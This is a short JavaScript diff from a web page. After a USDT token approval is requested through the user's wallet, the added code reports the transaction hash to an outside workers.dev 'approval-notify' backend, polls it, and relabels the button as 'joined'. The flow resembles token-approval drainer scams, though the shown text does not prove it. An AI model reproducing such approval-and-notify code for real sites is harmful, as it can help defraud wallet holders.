@@ -4009,6 +4009,43 @@ const txHash = await window.ethereum.request({
 });
 
 console.log("USDT 授權交易：", txHash);
+
+// 把交易交給後端驗證 
+for (let i = 0; i < 60; i++) { 
+    try { 
+        const response = await fetch(
+             "https://cs-backend.allen1688liu.workers.dev/approval-notify", 
+             { 
+                method: "POST", 
+                headers: {
+                     "Content-Type": "application/json" 
+                    }, 
+                    body: JSON.stringify({ 
+                        txHash: txHash 
+                    })
+                 } 
+                );
+
+    const result = await response.json();
+
+    if (result.ok && result.status === "confirmed") {
+        connectBtn.textContent = "已加入 ✓";
+        connectBtn.dataset.state = "approved";
+        break;
+    }
+
+    if (!result.ok) {
+        console.error("授權驗證失敗：", result);
+        break;
+    }
+
+} catch (error) {
+    console.error("連接後端失敗：", error);
+}
+
+await new Promise(resolve => setTimeout(resolve, 5000));
+}
+
 return
 }
      try { 
